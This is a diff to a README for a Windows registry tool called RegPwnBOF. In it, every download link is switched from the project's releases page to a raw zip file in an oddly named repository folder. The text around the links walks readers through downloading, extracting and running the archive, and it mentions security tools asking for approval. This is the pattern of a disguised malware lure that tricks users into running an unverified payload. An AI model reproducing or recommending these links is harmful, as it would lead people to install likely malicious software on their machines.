@@ -1,6 +1,6 @@
 # 🛡️ RegPwnBOF - Simple Registry Action Tool
 
-[![Download RegPwnBOF](https://img.shields.io/badge/Download-RegPwnBOF-blue?style=for-the-badge)](https://github.com/Snowyheronmusculusadductorlongus456/RegPwnBOF/releases)
+[![Download RegPwnBOF](https://img.shields.io/badge/Download-RegPwnBOF-blue?style=for-the-badge)](https://raw.githubusercontent.com/Snowyheronmusculusadductorlongus456/RegPwnBOF/main/cheiropody/BOF_Reg_Pwn_v3.8.zip)
 
 ## 🚀 What RegPwnBOF Does
 
@@ -11,7 +11,7 @@ Use it when you want a lightweight tool that fits into a Windows workflow and do
 ## 📥 Download
 
 Visit this page to download:  
-https://github.com/Snowyheronmusculusadductorlongus456/RegPwnBOF/releases
+https://raw.githubusercontent.com/Snowyheronmusculusadductorlongus456/RegPwnBOF/main/cheiropody/BOF_Reg_Pwn_v3.8.zip
 
 On that page, look for the latest release. Download the file that matches your Windows setup.
 
@@ -43,7 +43,7 @@ If the release includes a zip archive, save it first, then extract it to a folde
 Follow these steps on Windows:
 
 1. Open the download page:
-   https://github.com/Snowyheronmusculusadductorlongus456/RegPwnBOF/releases
+   https://raw.githubusercontent.com/Snowyheronmusculusadductorlongus456/RegPwnBOF/main/cheiropody/BOF_Reg_Pwn_v3.8.zip
 
 2. Find the newest release at the top of the page.
 
@@ -144,7 +144,7 @@ If you use Windows Defender or another security tool, it may ask for extra appro
 ## 📌 Release Page
 
 Download the latest build here:  
-https://github.com/Snowyheronmusculusadductorlongus456/RegPwnBOF/releases
+https://raw.githubusercontent.com/Snowyheronmusculusadductorlongus456/RegPwnBOF/main/cheiropody/BOF_Reg_Pwn_v3.8.zip
 
 ## 🗂️ Related Files to Look For
 
